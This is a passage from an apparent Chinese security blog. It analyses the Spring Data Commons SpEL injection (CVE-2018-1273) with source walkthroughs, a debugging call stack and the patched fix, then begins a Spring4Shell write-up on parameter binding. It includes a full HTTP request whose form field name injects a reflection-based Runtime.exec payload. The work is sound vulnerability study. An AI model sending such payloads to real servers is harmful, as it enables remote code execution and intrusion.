class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPropertyValue</span><span class="hljs-params">(String propertyName, <span class="hljs-meta">@Nullable</span> Object value)</span> <span class="hljs-keyword">throws</span> BeansException &#123;<br>    <span class="hljs-comment">// 检查属性是否可写</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.isWritableProperty(propertyName)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NotWritablePropertyException</span>(<span class="hljs-built_in">this</span>.type, propertyName);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 创建解析上下文</span><br>        <span class="hljs-type">StandardEvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>        <span class="hljs-comment">// 添加属性访问器以支持复杂类型的属性访问</span><br>        context.addPropertyAccessor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PropertyTraversingMapAccessor</span>(<span class="hljs-built_in">this</span>.type, <span class="hljs-built_in">this</span>.conversionService));<br>        <span class="hljs-comment">// 设置类型转换器</span><br>        context.setTypeConverter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardTypeConverter</span>(<span class="hljs-built_in">this</span>.conversionService));<br>        <span class="hljs-comment">// 设置类型定位器，此处简化处理，直接抛出异常表示未找到类型</span><br>        context.setTypeLocator((typeName) -&gt; &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelEvaluationException</span>(SpelMessage.TYPE_NOT_FOUND, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;typeName&#125;);<br>        &#125;);<br>        <span class="hljs-comment">// 设置根对象，即要操作的map</span><br>        context.setRootObject(<span class="hljs-built_in">this</span>.map);<br>        <span class="hljs-comment">// 解析表达式</span><br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> PARSER.parseExpression(propertyName);<br>        <span class="hljs-comment">// 获取属性路径的末尾属性</span><br>        <span class="hljs-type">PropertyPath</span> <span class="hljs-variable">leafProperty</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getPropertyPath(propertyName).getLeafProperty();<br>        <span class="hljs-comment">// 获取末尾属性的拥有类型和属性类型信息</span><br>        TypeInformation&lt;?&gt; owningType = leafProperty.getOwningType();<br>        TypeInformation&lt;?&gt; propertyType = leafProperty.getTypeInformation();<br>        <span class="hljs-comment">// 如果是数组或集合属性，获取其实际类型</span><br>        propertyType = propertyName.endsWith(<span class="hljs-string">&quot;]&quot;</span>) ? propertyType.getActualType() : propertyType;<br>        <span class="hljs-comment">// 如果需要类型转换，进行类型转换</span><br>        <span class="hljs-keyword">if</span> (propertyType != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-built_in">this</span>.conversionRequired(value, propertyType.getType())) &#123;<br>            <span class="hljs-comment">// 获取属性描述符</span><br>            <span class="hljs-type">PropertyDescriptor</span> <span class="hljs-variable">descriptor</span> <span class="hljs-operator">=</span> BeanUtils.getPropertyDescriptor(owningType.getType(), leafProperty.getSegment());<br>            <span class="hljs-keyword">if</span> (descriptor == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(String.format(<span class="hljs-string">&quot;Couldn&#x27;t find PropertyDescriptor for %s on %s!&quot;</span>, leafProperty.getSegment(), owningType.getType()));<br>            &#125;<br><br>            <span class="hljs-comment">// 创建方法参数对象，用于获取类型描述符</span><br>            <span class="hljs-type">MethodParameter</span> <span class="hljs-variable">methodParameter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodParameter</span>(descriptor.getReadMethod(), -<span class="hljs-number">1</span>);<br>            <span class="hljs-type">TypeDescriptor</span> <span class="hljs-variable">typeDescriptor</span> <span class="hljs-operator">=</span> TypeDescriptor.nested(methodParameter, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">if</span> (typeDescriptor == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(String.format(<span class="hljs-string">&quot;Couldn&#x27;t obtain type descriptor for method parameter %s!&quot;</span>, methodParameter));<br>            &#125;<br><br>            <span class="hljs-comment">// 执行类型转换</span><br>            value = <span class="hljs-built_in">this</span>.conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);<br>        &#125;<br><br>        <span class="hljs-comment">// 尝试设置属性值</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            expression.setValue(context, value);<br>        &#125; <span class="hljs-keyword">catch</span> (SpelEvaluationException o_O) &#123;<br>            <span class="hljs-comment">// 如果设置失败，抛出异常</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NotWritablePropertyException</span>(<span class="hljs-built_in">this</span>.type, propertyName, <span class="hljs-string">&quot;Could not write property!&quot;</span>, o_O);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们来分析一下</p><p>首先我们要想走到 SpEL 表达式解析，我们肯定是要 <code>!this.isWritableProperty(propertyName)</code> 这个 if 判断为 false</p><p>propertyName 是传进来的参数，从项目的首页不难看出是一个注册用户的功能，对应的就是 <code>example.users.web.UserController#register</code> 方法</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250511163706971.png" alt="image-20250511163706971" style="zoom:50%;" /><p>看到传入的 Bean 对象为 UserForm，我们看一下他的属性，有 <code>Username</code>, <code>Password</code>, <code>RepeatedPassword</code> 这三个属性，也就是说 propertyName 必须是这三个中的一个</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250511164009571.png" alt="image-20250511164009571" style="zoom:50%;" /><p>这其实也正好对应了我们首页中的表单值</p><p>属性名可以是 <code>Username</code> 然后会进入 else 分支，但是我们不能只传入 <code>Username</code> 这个普通的字符串，我们得想办法注入 SpEL 表达式</p><p>看一下 <code>isWritableProperty</code> 方法的实现，内部调用了 <code>getPropertyPath</code> 方法</p><center>    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250511164507521.png" alt="image-20250511164507521" width="400px;" />    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250511164633292.png" alt="image-20250511164633292" width="400px;" /></center><p>所以我们可以利用 <code>Username[SpEL]</code> 的方式注入表达式</p><p>但是进入了 else 分支，并没有万事大吉，因为还有一个安全限制, 用 lambda 表达式写的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">context.setTypeLocator((typeName) -&gt; &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelEvaluationException</span>(SpelMessage.TYPE_NOT_FOUND, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;typeName&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>拆成普通的 java 语法就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">context.setTypeLocator(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeLocator</span>() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; findType(String typeName) <span class="hljs-keyword">throws</span> SpelEvaluationException &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelEvaluationException</span>(SpelMessage.TYPE_NOT_FOUND, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;typeName&#125;);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>这里就是防止了 <code>T(类名)</code> 这种类型的 payload 攻击。</p><p>SpEL 解析器有 <code>类型定位器（TypeLocator）</code>，用于把 <code>T(类名)</code> 解析为 Java 的类对象，<code>TypeLocator</code> 默认会自动查找 classpath 下的类。</p><p>而这里用 lambda 表达式，定义了一个匿名的 TypeLocator 并且不管传入什么类型的 <code>T(类名)</code>，都会直接抛出异常。</p><p>所以我们只能用 <code>#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;)</code> 这种反射执行的表达式</p><h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><p>用 burp 抓包，修改参数名称</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/users?page=&amp;size=5</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>47<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;-Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;102&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:8080/users<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-sas">username[#this.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRun<span class="hljs-meta">time</span>().exec(<span class="hljs-string">&quot;calc&quot;</span>)]=root<span class="hljs-variable">&amp;password</span>=12345<span class="hljs-variable">&amp;repeatedPassword</span>=12345</span><br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250511181026587.png" alt="image-20250511181026587"></p><h3 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h3><p>在 <code>org.springframework.data.web.MapDataBinder.MapPropertyAccessor#setPropertyValue</code> 打断点，看到 <code>username</code> 参数，开始单步调试。</p><p>看到我们的 payload 正常来到了 else 分支</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250511181212413.png" alt="image-20250511181212413"></p><p>绕够了 TypeLocator 限制</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250511182924418.png" alt="image-20250511182924418"></p><p>setValue 解析表达式</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250511183147641.png" alt="image-20250511183147641"></p><p>在 org.springframework.expression.spel.ast.MethodReference#getValueInternal</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250511183945631.png" alt="image-20250511183945631"></p><p>调用栈</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">getValueInternal:<span class="hljs-number">134</span>, MethodReference (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.expression</span><span class="hljs-selector-class">.spel</span>.ast)<br>access$<span class="hljs-number">000</span>:<span class="hljs-number">53</span>, MethodReference (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.expression</span><span class="hljs-selector-class">.spel</span>.ast)<br>getValue:<span class="hljs-number">360</span>, MethodReference<span class="hljs-variable">$MethodValueRef</span> (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.expression</span><span class="hljs-selector-class">.spel</span>.ast)<br>getValueInternal:<span class="hljs-number">89</span>, CompoundExpression (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.expression</span><span class="hljs-selector-class">.spel</span>.ast)<br>getValueRef:<span class="hljs-number">134</span>, Indexer (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.expression</span><span class="hljs-selector-class">.spel</span>.ast)<br>getValueRef:<span class="hljs-number">67</span>, CompoundExpression (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.expression</span><span class="hljs-selector-class">.spel</span>.ast)<br>setValue:<span class="hljs-number">96</span>, CompoundExpression (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.expression</span><span class="hljs-selector-class">.spel</span>.ast)<br>setValue:<span class="hljs-number">464</span>, SpelExpression (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.expression</span><span class="hljs-selector-class">.spel</span>.standard)<br>setPropertyValue:<span class="hljs-number">217</span>, MapDataBinder<span class="hljs-variable">$MapPropertyAccessor</span> (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.data</span>.web)<br>setPropertyValue:<span class="hljs-number">67</span>, AbstractPropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>setPropertyValues:<span class="hljs-number">97</span>, AbstractPropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>applyPropertyValues:<span class="hljs-number">839</span>, DataBinder (org<span class="hljs-selector-class">.springframework</span>.validation)<br>doBind:<span class="hljs-number">735</span>, DataBinder (org<span class="hljs-selector-class">.springframework</span>.validation)<br>doBind:<span class="hljs-number">197</span>, WebDataBinder (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.bind)<br>bind:<span class="hljs-number">720</span>, DataBinder (org<span class="hljs-selector-class">.springframework</span>.validation)<br></code></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>SpringBoot 在 2.0.1.RELEASE 版本使用 SimpleEvaluationContext 替换了 StandardEvaluationContext</p><p>SimpleEvaluationContext功能受限，不支持类型引用T(类名)、方法调用、构造函数调用、bean引用、自定义类型转换等高级功能。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250511190103326.png" alt="image-20250511190103326"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250511190130309.png" alt="image-20250511190130309"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qsort_/article/details/105938025">Spring RCE 漏洞分析 2（CVE-2018-1273）-CSDN 博客</a></p><p><a href="https://milkfr.github.io/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2019/11/17/analysis-spring-data-commons-rce/">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）分析 | milkfr</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>Spring</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>Spring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring4Shell漏洞分析</title>
    <link href="/2025/05/10/Spring4Shell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2025/05/10/Spring4Shell%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Spring4Shell-漏洞"><a href="#Spring4Shell-漏洞" class="headerlink" title="Spring4Shell 漏洞"></a>Spring4Shell 漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Spring4Shell 漏洞实际上是对先前漏洞 CVE-2010-1622 的补丁绕过，CVE-2010-1622，原理就是基于上面的 JavaBean 赋值规则。可以通过提交 <code>class.classLoader</code> 参数，最终执行 <code>getClassLoader</code> 函数获取 <code>ClassLoader</code> 对象，进而利用 <code>URLs[0]</code> 属性远程加载可执行的恶意 jar 包，导致 RCE。而 Spring4Shell 是由于在 jdk9 以后在 <code>java.lang.Class</code> 类中新增了一个私有变量 <code>module</code>，可以利用 module 获得 ClassLoader 从而实现了一些意想不到的效果。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="SpringMVC-参数绑定"><a href="#SpringMVC-参数绑定" class="headerlink" title="SpringMVC 参数绑定"></a>SpringMVC 参数绑定</h3><p>我们先来看对于一个 http 请求，spring 的 contoller 是如何进行参数的封装的，其实就是会根据属性名，调用对应的 getter 和 setter 方法。</p><p>例如一个简单的 get 请求参数 <code>name=lingx5&amp;age=18</code></p><p>他就会先去调用 getName() 方法, 碰到 <code>=</code> 号，再调用 setName() 方法。后面的 age 也是一样的</p><p>我们可以写一个测试的例子，来具体的看一个是如何执行的</p><p><strong>目录结构</strong></p><p>创建一个 springboot 项目，添加如下目录结构</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250507183250883.png" alt="image-20250507183250883"></p><p><strong>User 类</strong></p><p>其实就是一个 SpringBean</p><blockquote><p>再 SpringBoot 项目中，entry 目录一般就是存放数据库表所对应用的 Bean 对象的</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring4shell.entry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-comment">// 内部类用于模仿一个Bean中有另一个bean的情况</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;调用了Test.getId方法&quot;</span>);<br>            <span class="hljs-keyword">return</span> id;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;调用了Test.setId方法&quot;</span>);<br>            <span class="hljs-built_in">this</span>.id = id;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Test&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;id=&quot;</span> + id +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 定义bean的属性</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> Test test;<br>    <span class="hljs-comment">// 生成getter和setter方法</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了getName方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了setName方法&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了getAge方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了setAge方法&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Test <span class="hljs-title function_">getTest</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了getTest方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTest</span><span class="hljs-params">(Test test)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了setTest方法&quot;</span>);<br>        <span class="hljs-built_in">this</span>.test = test;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>UserController 类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring4shell.controller;<br><br><span class="hljs-keyword">import</span> com.lingx5.spring4shell.entry.User;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserContorller</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/adduser&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">addUser</span><span class="hljs-params">(User user)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>传参为 User 这个对象，我们启动 springboot 项目，发送请求 <code>http://localhost:8080/adduser?name=lingx5&amp;test.id=1</code></p><p>可以发现控制台输出</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250507183840814.png" alt="image-20250507183840814" style="zoom: 67%;" /><p>其内部就是有 springMVC 的组件 <code>WebDataBinder</code> 调用 <code>BeanWrapperImpl.BeanPropertyHandler#getValue</code> 和 <code>BeanWrapperImpl.BeanPropertyHandler#setValue</code> 内部本质是反射来实现的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250507201211271.png" alt="image-20250507201211271"></p><p>可以看一下调用 getter 的调用栈，其他的都是一样的，可以自己调一下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">getName:<span class="hljs-number">31</span>, User (com<span class="hljs-selector-class">.lingx5</span><span class="hljs-selector-class">.spring4shell</span>.entry)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (jdk<span class="hljs-selector-class">.internal</span>.reflect)<br>invoke:<span class="hljs-number">77</span>, NativeMethodAccessorImpl (jdk<span class="hljs-selector-class">.internal</span>.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (jdk<span class="hljs-selector-class">.internal</span>.reflect)<br>invoke:<span class="hljs-number">568</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)<br>getValue:<span class="hljs-number">308</span>, BeanWrapperImpl<span class="hljs-variable">$BeanPropertyHandler</span> (org<span class="hljs-selector-class">.springframework</span>.beans)<br>processLocalProperty:<span class="hljs-number">446</span>, AbstractNestablePropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>setPropertyValue:<span class="hljs-number">278</span>, AbstractNestablePropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>setPropertyValue:<span class="hljs-number">266</span>, AbstractNestablePropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>setPropertyValues:<span class="hljs-number">104</span>, AbstractPropertyAccessor (org<span class="hljs-selector-class">.springframework</span>.beans)<br>applyPropertyValues:<span class="hljs-number">856</span>, DataBinder (org<span class="hljs-selector-class">.springframework</span>.validation)<br>doBind:<span class="hljs-number">751</span>, DataBinder (org<span class="hljs-selector-class">.springframework</span>.validation)<br>doBind:<span class="hljs-number">198</span>, WebDataBinder (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.bind)<br>bind:<span class="hljs-number">118</span>, ServletRequestDataBinder (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.web</span>.bind)<br></code></pre></td></tr></table></figure><p>setter 的调用栈</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">setName:<span 